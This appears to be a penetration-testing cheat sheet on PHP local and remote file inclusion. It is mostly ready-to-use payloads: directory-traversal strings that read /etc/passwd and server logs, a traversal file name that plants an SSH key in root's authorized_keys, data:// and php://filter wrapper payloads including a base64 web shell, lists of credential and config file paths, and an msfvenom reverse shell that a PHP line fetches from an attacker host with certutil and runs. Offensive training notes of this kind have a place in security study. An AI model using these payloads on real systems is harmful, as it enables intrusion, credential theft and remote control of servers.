# File inclusion

{% code overflow="wrap" %}
```
page=../../../../../../../../../var/log/apache2/access.log
page=../../../etc/passwd%00
page=../../../../../../etc/passwd?
page=../../../../../../etc/passwd%00jpg     
```
{% endcode %}

Can try generating and uploading ssh key:

```sh
ssh-keygen
#produces 2 files, fileup and fileup.pub

cat fileup.pub > authorized_keys
```

File name when uploading file to webapp:

```
../../../../../../../root/.ssh/authorized_keys
```

remove known hosts to avoid errors

```sh
rm ~/.ssh/known_hosts
```

```sh
ssh -p 2222 -i fileup root@mountaindesserts.com
```

## Wrappers

### Data wrappers

{% hint style="danger" %}
data:// wrapper wrill not work by default.

[_allow\_url\_include_](https://www.php.net/manual/en/filesystem.configuration.php) setting needs to be enabled
{% endhint %}

```
file=data:text/plain,helloworld
```

* if returns plaintext 'helloworld' then we can inject code

<pre class="language-php" data-overflow="wrap"><code class="lang-php">file=data:text/plain,&#x3C;?php echo shell_exec("dir") ?>
<strong>
</strong><strong>page=data://text/plain,&#x3C;?php%20echo%20system('ls');?>
</strong></code></pre>

#### Command execution:

Base64 encode payload:

```sh
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

Embed and execute the payload:

{% code overflow="wrap" %}
```
page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```
{% endcode %}

### Filter wrappers

Access a file with wrappers:

```
page=php://filter/resource=admin.php
```

Base64 econde page:

{% code overflow="wrap" %}
```php
page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

page=php://filter/convert.base64-encode/resource=admin.php
```
{% endcode %}

Decode:

{% code overflow="wrap" %}
```
echo "{base64_encoded_value}" | base64 -d
```
{% endcode %}

* output may include sensitive info such as database connection creds within the php code etc



## Linux files

```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/var/log/messages
/var/log/cron.log
/var/log/secure
/var/log/auth.log
```

### CMS Config Files

```
WordPress: /var/www/html/wp-config.php
Joomla: /var/www/configuration.php
Dolphin CMS: /var/www/html/inc/header.inc.php
Drupal: /var/www/html/sites/default/settings.php
Mambo: /var/www/configuration.php
PHPNuke: /var/www/config.php
PHPbb: /var/www/config.php
```

## Windows Files

```
C:/Windows/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/Panther/Unattend.txt
C:/Unattend.xml
C:/Autounattend.xml
C:/Windows/system32/sysprep
C:/inetpub/wwwroot
C:/inetpub/wwwroot/web.config
C:/inetpub/logs/logfiles
C:/inetpub/logs/LogFiles/W3SVC1
```

### XAMPP Files

```
C:/xampp/apache/conf/httpd.conf
C:/xampp/security/webdav.htpasswd
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/xampp/tomcat/conf/tomcat-users.xml
C:/xampp/tomcat/conf/web.xml
C:/xampp/webalizer/webalizer.conf
C:/xampp/webdav/webdav.txt
C:/xampp/apache/bin/php.ini
C:/xampp/apache/conf/httpd.conf
```



### RFI

A good php rev shell that works on linux and windows

{% embed url="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php?ref=benheater.com" %}

***

Alternate option for Windows:

1. Generate shell payload

{% code overflow="wrap" %}
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=kali_ip LPORT=1234 -f exe > shell.exe 
```
{% endcode %}

2. Upload file to download shell

{% code title="download.php" overflow="wrap" %}
```php
<?php $download = system('certutil.exe -urlcache -f http://kali_ip/shell.exe shell.exe', $val) ?>
```
{% endcode %}

3. Run shell

{% code title="run.php" overflow="wrap" %}
```php
<?php $exec = system('shell.exe', $val) ?>
```
{% endcode %}
